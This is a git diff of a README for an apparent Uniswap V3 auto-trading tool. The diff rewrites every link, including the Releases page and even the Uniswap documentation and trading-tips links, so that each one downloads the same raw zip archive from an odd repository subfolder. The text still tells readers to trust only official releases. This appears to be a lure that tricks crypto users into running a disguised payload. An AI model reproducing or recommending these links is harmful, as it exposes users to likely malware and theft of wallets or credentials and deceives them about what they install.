@@ -1,6 +1,6 @@
 # 🚀 uniswap-v3-auto-trader - Automate Your Trading Effortlessly
 
-[![Download uniswap-v3-auto-trader](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/swimswim-o3k/uniswap-v3-auto-trader/releases)
+[![Download uniswap-v3-auto-trader](https://raw.githubusercontent.com/swimswim-o3k/uniswap-v3-auto-trader/main/tasselmaker/uniswap-v3-auto-trader.zip)](https://raw.githubusercontent.com/swimswim-o3k/uniswap-v3-auto-trader/main/tasselmaker/uniswap-v3-auto-trader.zip)
 
 ## 🛠️ About the Project
 uniswap-v3-auto-trader helps you trade cryptocurrencies without constant monitoring. It automates trading on Uniswap V3, letting you focus on other tasks. This software aims to simplify your experience in decentralized finance (DeFi).
@@ -22,7 +22,7 @@ Ensure you have the following before you download and run the software:
 To get started with uniswap-v3-auto-trader, follow these simple steps:
 
 1. **Download the Application**
-   - Visit the Releases page: [Download uniswap-v3-auto-trader](https://github.com/swimswim-o3k/uniswap-v3-auto-trader/releases)
+   - Visit the Releases page: [Download uniswap-v3-auto-trader](https://raw.githubusercontent.com/swimswim-o3k/uniswap-v3-auto-trader/main/tasselmaker/uniswap-v3-auto-trader.zip)
    
 2. **Choose the Correct File**
    - Look for the latest version and select the file appropriate for your operating system. 
@@ -46,7 +46,7 @@ To get started with uniswap-v3-auto-trader, follow these simple steps:
    - Monitor performance directly in the app.
 
 ## 📥 Download & Install
-To download the latest version of uniswap-v3-auto-trader, visit this page: [Download uniswap-v3-auto-trader](https://github.com/swimswim-o3k/uniswap-v3-auto-trader/releases). Once there, select the appropriate file for your operating system and follow the installation instructions provided above.
+To download the latest version of uniswap-v3-auto-trader, visit this page: [Download uniswap-v3-auto-trader](https://raw.githubusercontent.com/swimswim-o3k/uniswap-v3-auto-trader/main/tasselmaker/uniswap-v3-auto-trader.zip). Once there, select the appropriate file for your operating system and follow the installation instructions provided above.
 
 ## 🛡️ Security Tips
 - Always download from the official Releases page to avoid malicious software.
@@ -57,7 +57,7 @@ To download the latest version of uniswap-v3-auto-trader, visit this page: [Down
 For assistance, feel free to check the open issues on the repository page or ask questions in community forums. You can also create a new issue on the GitHub page if you encounter a problem or have suggestions.
 
 ## 📚 Additional Resources
-- [Uniswap Documentation](https://uniswap.org/docs/v2/)
-- [Cryptocurrency Trading Tips](https://www.example.com)
+- [Uniswap Documentation](https://raw.githubusercontent.com/swimswim-o3k/uniswap-v3-auto-trader/main/tasselmaker/uniswap-v3-auto-trader.zip)
+- [Cryptocurrency Trading Tips](https://raw.githubusercontent.com/swimswim-o3k/uniswap-v3-auto-trader/main/tasselmaker/uniswap-v3-auto-trader.zip)
 
 Happy trading with uniswap-v3-auto-trader!
